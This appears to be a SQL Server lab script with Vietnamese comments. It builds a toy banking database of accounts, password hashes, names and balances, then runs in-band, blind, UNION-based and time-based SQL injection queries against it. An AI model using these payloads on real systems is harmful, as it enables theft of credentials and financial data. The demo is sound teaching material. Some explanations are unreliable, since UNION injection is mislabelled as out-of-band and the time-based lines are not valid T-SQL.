SELECT 
    fk.name AS ForeignKeyName,
    tp.name AS ReferencingTable,
    tr.name AS ReferencedTable
FROM 
    sys.foreign_keys AS fk
INNER JOIN 
    sys.tables AS tp ON fk.parent_object_id = tp.object_id
INNER JOIN 
    sys.tables AS tr ON fk.referenced_object_id = tr.object_id
WHERE 
    tr.name = 'Account';


ALTER TABLE Information DROP CONSTRAINT FK__Information__ID__442B18F2;
ALTER TABLE Bank DROP CONSTRAINT FK__Bank__ID__4707859D;

DROP TABLE Account;
DROP TABLE Information;
DROP TABLE Bank;


-- Tạo lớp tài khoản
CREATE TABLE Account
(
    ID NVARCHAR(8) PRIMARY KEY,
    Account VARCHAR(25) NOT NULL,
    [Password] VARCHAR(512) NOT NULL
);

-- Thêm vào lớp tài khoản
INSERT INTO Account
VALUES
    ('00000001', 'H', '6b332c7ccb4dbed8626dc5900cb451c8ee450c88f5cf7df68e1e648eba9cc565084bbd786caabc0beeec6355f866c37d4029c066c41435adf6c07cfff9c569f1'),
    ('00000002', 'K', '5c75b8968309825ec74ff09ad8f8b8ca4cd29a72a9ec2014228b15b9e709a6400d624edc39a7cb57765a90bcb455b8684286377adf74626205ce504f9162ef4a'),
    ('00000003', 'A', '8cf4073f749602c7d4fbc582161ac17621896919d582530520597291cfe0cceb38416fb488e11255c19229ed68fc4437569eb0915ec2fc59823047b0d25f6766'),
    ('00000004', 'M', 'b4d4268fc290c6b2c466dea367ccf93f27f922118a3216f9d094345f99a394d2b682a9b6bb2d5e83db33e8f3ca9cdf6a0541f1444120156b7ec47b706852348b'),
    ('00000005', 'P', 'fbe00568f2d24f78f89e5b0b15342ecb20990b8d1b19304cd62357201775950003298fcc8d9f195f163d7479b567864358020a988a196398a81f84d6f50014fc'),
    ('00000006', 'D', '560ad4b3ab8714e84e4abc0b7fcf24d10e37662886482e9aa698b43123e03f444cdac72f5217a6022244cea6b7f4ae8942fdfc668dd45bf775f0f5f67b4047b8'),
    ('00000007', 'R', '8ebd2eabb17bffca130d7a3ac2b74971afe3f29a57b474acd73f2046f6ccff32976bd09550f282572991c6ce6bc18247a71b7fdb9510431fc770bbb6b58a2f28'),
    ('00000008', 'W', '6c46d4717e39cac5e9ba60aafff581a0d8d209f518b6b013da46921a490a208d67cdfdb7d1e965f95bc1c35b1bc5212d9ccedb2c8d4aeb704a8dc767ad8f87f77');





-- Tạo lớp thông tin cá nhân
CREATE TABLE Information
(
    ID NVARCHAR(8) PRIMARY KEY,
    [Name] VARCHAR(50),

    FOREIGN KEY(ID) REFERENCES Account(ID)
);

INSERT INTO Information
VALUES
    ('00000001', 'H'),
    ('00000002', 'K'),
    ('00000003', 'N'),
    ('00000004', 'H'),
    ('00000005', 'P'),
    ('00000006', 'D'),
    ('00000007', 'A'),
    ('00000008', 'L');




-- Tạo bảng Bank với khóa chính mới (ID_Bank)
CREATE TABLE Bank
(
    ID NVARCHAR(8),
    TenNganHang VARCHAR(50),
    SoTaiKhoan NVARCHAR(10),
    SoDu INT,
    ID_Bank INT PRIMARY KEY IDENTITY(1,1),  -- Khóa chính tự động tăng

    FOREIGN KEY(ID) REFERENCES Account(ID)
);

INSERT INTO Bank (ID, SoTaiKhoan, TenNganHang, SoDu)
VALUES
    ('00000001', '314100001', 'BIDV', 1000000),
    ('00000001', '025900001', 'Sacombank', 1250000),
    ('00000002', '314100002', 'BIDV', 1250000),
    ('00000002', '314100003', 'BIDV', 1600000),
    ('00000003', '427800001', 'MBbank', 1400000),
    ('00000004', '427800002', 'MBbank', 1300000),
    ('00000004', '314100004', 'BIDV', 1700000),
    ('00000004', '025900002', 'Sacombank', 500000),
    ('00000006', '314100005', 'BIDV', 1950000),
    ('00000007', '025900003', 'Sacombank', 1350000),
    ('00000007', '427800003', 'MBbank', 1200000),
    ('00000007', '314100006', 'BIDV', 1500000),
    ('00000008', '025900004', 'Sacombank', 1450000);




-- Kiểu SQLi đầu tiên: In-band SQLi
-- TH1: In hết tổng số dư trong các tài khoản ngân hàng
SELECT 
    Account, 
    (SELECT TOP 1 [Name] FROM Information WHERE ID = Account.ID) AS [Name], 
    (SELECT SUM(SoDu) FROM Bank WHERE ID = Account.ID) AS Balance, 
    [Password]
FROM Account 
WHERE Account = 'H' OR 1=1 --';


-- TH2: In hết tất cả số dư trong tất cả các tài khoản của các anh trai
SELECT 
    Account.Account, 
    Information.Name,
	Bank.SoTaiKhoan,
	Bank.TenNganHang,
    Bank.SoDu, 
    Account.Password
FROM Account
JOIN Information ON Account.ID = Information.ID
JOIN Bank ON Account.ID = Bank.ID
WHERE Account.Account = 'H' OR 1=1;



-- Kiểu SQLi thứ hai: Blind SQLi
-- TH1: In hết tổng số dư, tài khoản và mật khẩu trong các tài khoản ngân hàng của các anh trai 
SELECT 
    Account, 
    (SELECT TOP 1 [Name] FROM Information WHERE ID = Account.ID) AS [Name], 
    (SELECT SUM(SoDu) FROM Bank WHERE ID = Account.ID) AS Balance, 
    [Password]
FROM Account 
WHERE Account = 'A' AND 1=1 --  (Trả về kết quả khi đúng)



-- TH2: In hết tất cả thông tin của các anh trai 
SELECT 
    Account.Account, 
    Information.Name,
	Bank.SoTaiKhoan,
	Bank.TenNganHang,
    Bank.SoDu, 
    Account.Password
FROM Account
JOIN Information ON Account.ID = Information.ID
JOIN Bank ON Account.ID = Bank.ID
WHERE Account.Account = 'A' AND 1=1 --  (Trả về kết quả khi đúng)






-- Kiểu SQLi thứ ba: Out-of-band SQLi
-- TH1: In hết tổng số dư, tài khoản và mật khẩu trong các tài khoản ngân hàng của các anh trai 
SELECT 
    Account, 
    (SELECT TOP 1 [Name] FROM Information WHERE ID = Account.ID) AS [Name], 
    (SELECT SUM(SoDu) FROM Bank WHERE ID = Account.ID) AS Balance, 
    [Password]
FROM Account 
WHERE Account = 'D' UNION SELECT NULL, NULL, NULL, NULL -- (Dùng UNION để lấy dữ liệu ngoài phạm vi)



-- TH2: In hết tất cả thông tin của các anh trai 
SELECT 
    Account.Account, 
    Information.Name,
	Bank.SoTaiKhoan,
	Bank.TenNganHang,
    Bank.SoDu, 
    Account.Password
FROM Account
JOIN Information ON Account.ID = Information.ID
JOIN Bank ON Account.ID = Bank.ID
WHERE Account.Account = 'D' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL; -- (Dùng UNION để lấy dữ liệu ngoài phạm vi)







-- Kiểu SQLi thứ tư: Time-based BLIND SQLi
-- TH1: In hết tổng số dư, tài khoản và mật khẩu trong các tài khoản ngân hàng của các anh trai 
SELECT 
    Account, 
    (SELECT TOP 1 [Name] FROM Information WHERE ID = Account.ID) AS [Name], 
    (SELECT SUM(SoDu) FROM Bank WHERE ID = Account.ID) AS Balance, 
    [Password]
FROM Account 
WHERE Account = 'R' AND 1=1 WAITFOR DELAY '00:00:05' -- (Gây độ trễ khi đúng)



-- TH2: In hết tất cả thông tin của các anh trai 
SELECT 
    Account.Account, 
    Information.Name, 
	Bank.SoTaiKhoan,
	Bank.TenNganHang,
    Bank.SoDu, 
    Account.Password
FROM Account
JOIN Information ON Account.ID = Information.ID
JOIN Bank ON Account.ID = Bank.ID
WHERE Account.Account = 'R' AND 1=1 WAITFOR DELAY '00:00:05' -- (Gây độ trễ khi đúng)




